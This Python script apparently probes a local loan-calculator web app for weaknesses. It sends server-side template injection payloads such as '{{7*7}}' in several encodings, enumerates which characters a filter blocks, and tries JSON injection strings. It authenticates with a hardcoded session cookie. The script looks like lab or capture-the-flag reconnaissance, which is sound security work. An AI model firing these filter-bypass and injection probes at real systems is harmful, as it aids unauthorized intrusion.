import requests
import urllib.parse
import json

base_url = "http://127.0.0.1:5000"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYTgQ.zxJDgrrGBVoUrTrnwwifgdf1QW0"
cookies = {"session": session_cookie}

print("=" * 80)
print("ANALYZING /total_loan_payments JSON RENDERING MECHANISM")
print("=" * 80)

# Test 1: Baseline request
print("\n[TEST 1] Baseline request")
params1 = {"principal": "10000", "payment": "500", "term": "24"}
resp1 = requests.get(f"{base_url}/total_loan_payments", params=params1, cookies=cookies)
print(f"Status: {resp1.status_code}")
print(f"Content-Type: {resp1.headers.get('Content-Type')}")
print(f"Response: {resp1.text}")
print(f"Raw Content-Type: {resp1.headers.get('Content-Type')}")

# Test 2: Try template injection in different formats
print("\n" + "=" * 80)
print("[TEST 2] Template injection tests")
print("=" * 80)

template_tests = [
    ("original", "{{7*7}}"),
    ("url_encoded_once", "%7B%7B7*7%7D%7D"),
    ("url_encoded_twice", "%257B%257B7*7%257D%257D"),
    ("double_curly", "{{{{7*7}}}}"),
    ("with_spaces", "{{ 7*7 }}"),
    ("with_newline", "{{7*7}}\n"),
]

for test_name, payload in template_tests:
    print(f"\n[TEST] Template: {test_name} = {payload}")
    params = {"principal": payload, "payment": "500", "term": "24"}
    resp = requests.get(f"{base_url}/total_loan_payments", params=params, cookies=cookies)
    print(f"Status: {resp.status_code}")
    if resp.status_code == 400:
        print(f"Error: {resp.text}")
    else:
        print(f"Response: {resp.text}")

# Test 3: Character by character analysis
print("\n" + "=" * 80)
print("[TEST 3] Character-level filter analysis")
print("=" * 80)

# Test individual characters that might be in blacklist
suspicious_chars = ["{", "}", "%", "<", ">", "'", '"', ";", "(", ")", "[", "]", "|", "&", "$", "!", "@", "#", "^", "*", "?", "\\", "/"]

for char in suspicious_chars:
    print(f"\n[TEST] Character: '{char}' (ASCII: {ord(char)})")
    params = {"principal": f"100{char}00", "payment": "500", "term": "24"}
    resp = requests.get(f"{base_url}/total_loan_payments", params=params, cookies=cookies)
    print(f"Status: {resp.status_code}")
    if resp.status_code == 400:
        print(f"BLOCKED - Error: {resp.text}")
    else:
        print(f"ALLOWED - Response: {resp.text}")

# Test 4: Test different encodings of curly braces
print("\n" + "=" * 80)
print("[TEST 4] Encoding variations of curly braces")
print("=" * 80)

encoding_tests = [
    ("html_entity", "&#123;&#123;7*7&#125;&#125;"),
    ("unicode_escape", "\\u007b\\u007b7*7\\u007d\\u007d"),
    ("hex_encoded", "\x7b\x7b7*7\x7d\x7d"),
    ("mixed", "%7B{{7*7}}%7D"),
    ("only_left", "{{7*7"),
    ("only_right", "7*7}}"),
]

for test_name, payload in encoding_tests:
    print(f"\n[TEST] Encoding: {test_name}")
    params = {"principal": payload, "payment": "500", "term": "24"}
    resp = requests.get(f"{base_url}/total_loan_payments", params=params, cookies=cookies)
    print(f"Status: {resp.status_code}")
    if resp.status_code == 400:
        print(f"Error: {resp.text}")
    else:
        print(f"Response (truncated): {resp.text[:100]}")

# Test 5: Analysis of JSON structure
print("\n" + "=" * 80)
print("[TEST 5] JSON Structure Analysis")
print("=" * 80)

# Try different data types
structure_tests = [
    {"principal": "10000", "payment": "500", "term": "24"},
    {"principal": "10000.5", "payment": "500.75", "term": "24.5"},
    {"principal": "abc", "payment": "def", "term": "ghi"},
    {"principal": "true", "payment": "false", "term": "null"},
    {"principal": "[1,2,3]", "payment": "{'a':1}", "term": '"quoted"'},
]

for i, params in enumerate(structure_tests):
    print(f"\n[TEST] Structure test {i+1}: {params}")
    resp = requests.get(f"{base_url}/total_loan_payments", params=params, cookies=cookies)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text}")
    if resp.status_code == 200:
        try:
            parsed = resp.json()
            print(f"JSON Type Analysis:")
            for key, value in parsed.items():
                print(f"  {key}: {value} (type: {type(value).__name__})")
        except:
            print("Response is not valid JSON")

# Test 6: Compare with /home endpoint behavior
print("\n" + "=" * 80)
print("[TEST 6] Comparison with /home endpoint")
print("=" * 80)

# Test /home with template
print("\n[TEST] /home with template injection")
resp_home = requests.get(f"{base_url}/home?data={{7*7}}", cookies=cookies)
print(f"Status: {resp_home.status_code}")
print(f"Response: {resp_home.text[:200]}")

# Test /total_loan_payments with same
print("\n[TEST] /total_loan_payments with same template")
resp_loan = requests.get(f"{base_url}/total_loan_payments?principal={{7*7}}&payment=500&term=24", cookies=cookies)
print(f"Status: {resp_loan.status_code}")
if resp_loan.status_code == 400:
    print(f"Error: {resp_loan.text}")
else:
    print(f"Response: {resp_loan.text}")

# Test 7: Try to inject JSON structure
print("\n" + "=" * 80)
print("[TEST 7] JSON Injection Attempts")
print("=" * 80)

json_injection_tests = [
    {"principal": '"test"', "payment": "500", "term": "24"},
    {"principal": 'test"', "payment": "500", "term": "24"},
    {"principal": 'test\\"', "payment": "500", "term": "24"},
    {"principal": '","injected":"value"', "payment": "500", "term": "24"},
]

for i, params in enumerate(json_injection_tests):
    print(f"\n[TEST] JSON injection {i+1}")
    resp = requests.get(f"{base_url}/total_loan_payments", params=params, cookies=cookies)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text}")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
